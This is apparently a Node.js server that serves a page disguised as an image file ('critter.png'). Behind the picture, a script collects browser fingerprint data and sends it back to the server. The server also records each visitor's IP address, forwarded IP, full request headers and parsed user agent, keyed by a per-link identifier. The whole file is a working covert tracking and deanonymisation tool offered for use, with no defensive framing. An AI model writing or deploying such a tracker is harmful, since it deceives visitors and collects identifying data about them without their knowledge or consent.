const http = require('http')
const path = require('path')
const { URL } = require('url')
const fs = require('fs')
const UAParser = require('ua-parser-js')

const picturePath = path.resolve(__dirname, '../images/animals-0.png')
let pictureBase64

/**
 *
 */
async function getImage (picturePath) {
  return new Promise((resolve) => {
    if (pictureBase64 !== undefined) {
      return resolve(pictureBase64)
    }

    fs.readFile(picturePath, (err, data) => {
      if (err) {
        console.error('Error reading image file:', err)
        return
      }

      const base64Image = Buffer.from(data).toString('base64')
      const mimeType = 'image/png'

      pictureBase64 = `data:${mimeType};base64,${base64Image}`
      resolve(pictureBase64)
    })
  })
}

/**
 *
 */
async function getJs (jsPath, res) {
  return new Promise((resolve, reject) => {
    fs.readFile(jsPath, 'utf8', (err, content) => {
      if (err) {
        res.statusCode = 500
        res.end('Internal Server Error')
        return reject(err)
      }

      res.setHeader('Content-Type', 'application/javascript')
      res.end(content)
      return resolve(content)
    })
  })
}

/**
 *
 */
async function loadRequests (filePath) {
  return new Promise((resolve, reject) => {
    fs.readFile(filePath, 'utf8', (err, data) => {
      if (err) {
        return resolve({})
      }

      try {
        const jsonData = JSON.parse(data || {})
        return resolve(jsonData)
      } catch (jsonErr) {
        reject(jsonErr)
      }
    })
  })
}

async function main () {
  const requests = await loadRequests('requests.json')
  let shouldSave = false

  const server = http.createServer(async (req, res) => {
    const parsedUrl = new URL(req.url, `http://${req.headers.host}`)
    const queryParameters = parsedUrl.searchParams
    const identifier = queryParameters.get('i')

    if (parsedUrl.pathname === '/image.js') {
      await getJs('image.js', res)
    } else if (parsedUrl.pathname === '/getImage') {
      // Save fingerprint
      let body = ''

      req.on('data', chunk => {
        body += chunk.toString()
      })

      req.on('end', () => {
        // Parse the received fingerprint data (assumes JSON format)
        const fingerprintData = JSON.parse(body || '{}') || {}

        // Collect IP
        const ip = req.connection.remoteAddress

        // Collect user agent information
        const userAgent = req.headers['user-agent']

        // Collect forwarded IP (if available)
        const forwardedFor = req.headers['x-forwarded-for']
        const forwardedIp = forwardedFor ? forwardedFor.split(',')[0] : req.connection.remoteAddress

        // Collect forwarded protocol (if available)
        const forwardedProto = req.headers['x-forwarded-proto'] || req.connection.encrypted ? 'https' : 'http'

        const parser = new UAParser()
        parser.setUA(userAgent)
        const browserInfo = parser.getResult()

        // Process the fingerprint data
        const request = {
          fingerprints: fingerprintData,
          time: Date.now(),
          ip,
          browserInfo,
          url: parsedUrl.href,
          headers: req.headers,
          forwardedIp,
          forwardedProto
        }

        if (requests[identifier] === undefined) {
          requests[identifier] = []
        }

        requests[identifier].push(request)

        shouldSave = true

        // Respond with a success message
        res.statusCode = 200
        res.end()
      })
    } else if (identifier !== undefined) {
      // Serve a picture

      res.setHeader('Content-Type', 'text/html')
      res.end(`<!DOCTYPE html>
  <html>
  <head>
      <title>critter.png</title>
  </head>
  <body>
      <style>
        body {
          margin: 0;
          background-color: black;
        }
        img {
          height: 50%;
        }
      </style>
      <img src="${await getImage(picturePath)}" alt="A Picture">

      <script>
        const imagePromise = import('./image.js')
          .then(image => image.load())

        imagePromise
          .then(image => image.get())
          .then(image => {
            fetch('/getImage?i=${identifier}', {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify(image)
            })
          })

        /*
        const user = {
          platform: navigator.platform,
          language: navigator.language,
          colorDepth: window.screen.colorDepth,
          windowSize: {
            height: window.innerHeight,
            width: window.innerWidth
          },
          resolution: window.screen.width + 'x' + window.screen.height,
          timezoneOffset: new Date().getTimezoneOffset(),
          plugins: Array.from(navigator.plugins, plugin => plugin.name).join(','),
          fonts: Array.from(document.fonts, font => font.family).join(',')
        }

        fetch('/getImage?i=${identifier}', {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json'
          },
          body: JSON.stringify(user)
        })
        */
      </script>
  </body>
  </html>`)
    } else {
      res.statusCode = 404
      res.end('Not Found')
    }
  })

  const port = 3000
  server.listen(port, () => {
    console.log(`Server is running on port ${port}`)
  })

  setInterval(() => {
    if (shouldSave === true) {
      fs.writeFileSync('requests.json', JSON.stringify(requests))
      shouldSave = false
    }
  }, 1000)
}

main()
